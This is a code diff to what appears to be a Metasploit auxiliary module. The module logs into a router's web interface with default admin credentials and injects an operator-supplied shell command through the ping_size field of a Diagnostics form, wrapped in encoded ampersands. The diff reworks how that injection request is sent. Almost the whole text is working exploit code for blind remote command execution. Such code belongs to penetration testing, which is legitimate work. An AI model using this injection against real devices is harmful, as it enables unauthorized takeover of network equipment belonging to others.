@@ -40,7 +40,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				Opt::RPORT(80),
 				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
 				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
 				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
@@ -61,8 +60,8 @@ class Metasploit3 < Msf::Auxiliary
 						'authorization' => basic_auth(user,pass)
 						})
 
-				return :abort if res.nil?
-				return :abort if (res.code == 404)
+				return if res.nil?
+				return if (res.code == 404)
 
 			if [200, 301, 302].include?(res.code)
 				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
@@ -81,32 +80,33 @@ class Metasploit3 < Msf::Auxiliary
 
 		cmd = datastore['CMD']
 		#original post request:
-		data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="
+		#data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&
+		#action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="
 
-		vprint_status("#{rhost}:#{rport} - using the following target URL: \n#{uri}")
+		vprint_status("#{rhost}:#{rport} - using the following target URL: #{uri}")
 		begin
 			res = send_request_cgi(
 				{
 					'uri'    => uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					'data'  => data_cmd
-					#vars_post not working?
-					#'vars_post' => {
-					#	"submit_button" => "Diagnostics",
-					#	"change_action" => "gozila_cgi",
-					#	"submit_type" => "start_ping",
-					#	"action" => "",
-					#	"commit" => "0",
-					#	"ping_ip" => "1.1.1.1",
-					#	"ping_size" => "%26#{cmd}%26",
-					#	"ping_times" => "5",
-					#	"traceroute_ip" => ""
-					#	}
+					#'data'  => data_cmd
+					'encode_params' => false,
+					'vars_post' => {
+						"submit_button" => "Diagnostics",
+						"change_action" => "gozila_cgi",
+						"submit_type" => "start_ping",
+						"action" => "",
+						"commit" => "0",
+						"ping_ip" => "1.1.1.1",
+						"ping_size" => "%26#{cmd}%26",
+						"ping_times" => "5",
+						"traceroute_ip" => ""
+						}
 				})
 		rescue ::Rex::ConnectionError
 			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
-			return :abort
+			return
 		end
 		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
 	end
